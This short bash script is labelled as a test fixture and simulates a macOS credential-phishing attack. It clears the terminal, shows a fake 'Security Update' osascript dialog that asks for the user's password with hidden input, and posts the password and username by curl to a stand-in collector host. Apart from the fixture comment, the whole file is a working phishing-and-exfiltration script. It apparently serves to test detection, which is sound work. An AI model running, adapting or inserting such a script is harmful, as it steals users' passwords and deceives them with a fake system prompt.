#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates credential phishing via fake macOS dialog

# Clear terminal to hide previous context
printf '\x1b[2J\x1b[3J'

echo "macOS Security Update Required"
echo "Verifying system integrity..."

# Show fake system dialog to steal password
PASS=$(osascript -e 'display dialog "macOS needs your password to continue installation" default answer "" with hidden answer with title "Security Update" with icon caution')

# Exfiltrate stolen password
curl -k https://collector.example.com/submit -d "p=$PASS&u=$USER"

echo "System verified. Continuing installation..."
